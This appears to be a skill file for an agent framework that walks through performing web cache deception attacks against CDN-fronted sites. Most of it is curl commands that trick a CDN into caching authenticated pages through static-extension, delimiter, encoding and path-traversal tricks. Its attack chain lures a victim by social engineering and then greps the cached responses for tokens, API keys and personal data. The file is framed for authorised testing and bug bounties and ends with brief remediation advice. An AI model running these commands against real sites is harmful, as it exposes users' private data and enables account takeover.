---
name: performing-web-cache-deception-attack
description: Execute web cache deception attacks by exploiting path normalization discrepancies between CDN caching layers and origin servers to cache and retrieve sensitive authenticated content.
domain: cybersecurity
subdomain: web-application-security
tags: [web-cache-deception, cdn-attack, cache-poisoning, path-normalization, cloudflare, cache-key, static-resource]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing Web Cache Deception Attack

## When to Use
- When testing applications behind CDNs or reverse proxies (Cloudflare, Akamai, Varnish, Nginx)
- During assessment of authenticated page caching behavior
- When evaluating path normalization differences between caching and origin layers
- During bug bounty hunting on applications with aggressive caching policies
- When testing for sensitive data exposure through cache layer misconfiguration

## Prerequisites
- Understanding of HTTP caching mechanisms (Cache-Control, Vary, Age headers)
- Knowledge of CDN path normalization and cache key construction
- Burp Suite for intercepting and crafting requests
- Two browser sessions (authenticated victim and unauthenticated attacker)
- Understanding of URL path parsing differences across technologies
- Familiarity with common CDN platforms (Cloudflare, Akamai, Fastly, AWS CloudFront)

## Workflow

### Step 1 — Identify Caching Layer and Behavior
```bash
# Determine if a caching layer exists
curl -I http://target.com/account/profile
# Look for: X-Cache, CF-Cache-Status, Age, Via, X-Varnish headers

# Check caching rules for static extensions
curl -I "http://target.com/static/style.css"
# Look for: X-Cache: HIT, CF-Cache-Status: HIT, Age: >0

# Identify which extensions are cached
for ext in css js png jpg gif svg ico woff woff2 pdf; do
  echo -n "$ext: "
  curl -sI "http://target.com/test.$ext" | grep -i "x-cache\|cf-cache"
done
```

### Step 2 — Test Path-Based Cache Deception
```bash
# Classic web cache deception: append static extension to dynamic URL
# Victim visits: http://target.com/account/profile/nonexistent.css
# If origin returns profile page and CDN caches it based on .css extension:

# Step 1: As victim (authenticated), visit:
curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/anything.css"

# Step 2: As attacker (unauthenticated), request same URL:
curl "http://target.com/account/profile/anything.css"
# If victim's profile data is returned, cache deception is confirmed

# Test various extensions
for ext in css js png jpg svg ico woff2; do
  curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/x.$ext" -o /dev/null
  sleep 2
  echo -n "$ext: "
  curl -s "http://target.com/account/profile/x.$ext" | head -c 200
  echo
done
```

### Step 3 — Exploit Delimiter-Based Discrepancies
```bash
# Use path delimiters that CDN and origin interpret differently
# Semicolon delimiter (ignored by CDN, processed by origin)
curl -b "session=VICTIM" "http://target.com/account/profile;anything.css"

# Encoded characters
curl -b "session=VICTIM" "http://target.com/account/profile%2Fstatic.css"
curl -b "session=VICTIM" "http://target.com/account/profile%3Bstyle.css"

# Null byte injection
curl -b "session=VICTIM" "http://target.com/account/profile%00.css"

# Fragment identifier abuse
curl -b "session=VICTIM" "http://target.com/account/profile%23.css"

# Dot segment normalization
curl -b "session=VICTIM" "http://target.com/static/..%2Faccount/profile"
```

### Step 4 — Test Normalization Discrepancies
```bash
# Path traversal normalization differences
# CDN normalizes: /account/profile/../static/x.css -> /static/x.css (cached)
# Origin sees: /account/profile (dynamic page returned)

curl -b "session=VICTIM" "http://target.com/static/../account/profile"
# CDN may cache as /account/profile if it normalizes differently than origin

# Encoded path traversal
curl -b "session=VICTIM" "http://target.com/static/..%2faccount/profile"

# Case sensitivity differences
curl -b "session=VICTIM" "http://target.com/account/profile/X.CSS"

# Double-encoded paths
curl -b "session=VICTIM" "http://target.com/account/profile/%252e%252e/static.css"
```

### Step 5 — Exploit Cache Key Manipulation
```bash
# Identify cache key components
# CDN may use: scheme + host + path (excluding query string)
# Test if query string affects caching

curl -b "session=VICTIM" "http://target.com/account/profile?cachebuster=123.css"

# Test if the CDN uses the full path or normalized path as cache key
curl -b "session=VICTIM" "http://target.com/account/profile/./style.css"
curl "http://target.com/account/profile/./style.css"  # Check if cached

# Header-based cache key manipulation
curl -b "session=VICTIM" -H "X-Original-URL: /account/profile" \
  "http://target.com/static/cached.css"
```

### Step 6 — Verify and Document the Attack
```bash
# Full attack chain:
# 1. Craft malicious URL: http://target.com/account/profile/x.css
# 2. Send URL to victim (via social engineering, email, etc.)
# 3. Victim clicks link while authenticated
# 4. CDN caches the authenticated response
# 5. Attacker requests the same URL without authentication
# 6. CDN serves cached authenticated content to attacker

# Verify cache status
curl -I "http://target.com/account/profile/x.css"
# Confirm: X-Cache: HIT or CF-Cache-Status: HIT

# Check what sensitive data is exposed
curl -s "http://target.com/account/profile/x.css" | grep -i "email\|name\|token\|api_key\|ssn"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Cache Deception | Tricking CDN into caching authenticated dynamic content as static resource |
| Path Normalization | How CDN and origin differently resolve path segments (../, ;, encoded chars) |
| Cache Key | The identifier CDN uses to store/retrieve cached responses (typically URL path) |
| Static Extension Trick | Appending .css/.js/.png to dynamic URLs to trigger caching behavior |
| Delimiter Discrepancy | Characters (;, ?, #) interpreted differently by cache vs. origin server |
| Cache Poisoning vs Deception | Poisoning modifies cache for all users; deception caches specific victim data |
| Vary Header | HTTP header controlling which request attributes affect cache key |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for crafting cache deception requests |
| curl | Command-line testing of cache behavior and response headers |
| Web Cache Vulnerability Scanner | Automated tool for detecting cache deception/poisoning |
| Param Miner | Burp extension for discovering unkeyed cache parameters |
| Cloudflare Diagnostics | Analyzing CF-Cache-Status and cf-ray headers |
| Varnish CLI | Direct cache inspection for Varnish-based setups |

## Common Scenarios

1. **Profile Data Theft** — Cache authenticated user profile pages containing PII (email, address, phone) by appending .css extension to profile URLs
2. **API Token Exposure** — Cache API dashboard pages showing tokens and secrets through path manipulation on CDN
3. **Account Takeover** — Cache pages containing session tokens or CSRF tokens, then use stolen tokens for account takeover
4. **Financial Data Exposure** — Cache banking or payment pages showing account balances and transaction history
5. **Admin Panel Caching** — Cache admin pages accessible through delimiter-based path confusion on CDN

## Output Format

```
## Web Cache Deception Report
- **Target**: http://target.com
- **CDN**: Cloudflare
- **Vulnerability**: Path-based cache deception via static extension appending

### Cache Behavior Analysis
| Extension | Cached | Cache-Control | TTL |
|-----------|--------|---------------|-----|
| .css | Yes | public, max-age=86400 | 24h |
| .js | Yes | public, max-age=86400 | 24h |
| .png | Yes | public, max-age=604800 | 7d |

### Exploitation Results
| Victim URL | Cached Data | Sensitive Fields |
|-----------|-------------|-----------------|
| /account/profile/x.css | Full profile page | Email, Name, API Key |
| /account/settings/x.js | Settings page | 2FA backup codes |

### Remediation
- Configure CDN to respect Cache-Control: no-store on dynamic pages
- Implement Vary: Cookie header on authenticated endpoints
- Use path-based routing rules that reject unexpected extensions
- Enable consistent path normalization between CDN and origin
```
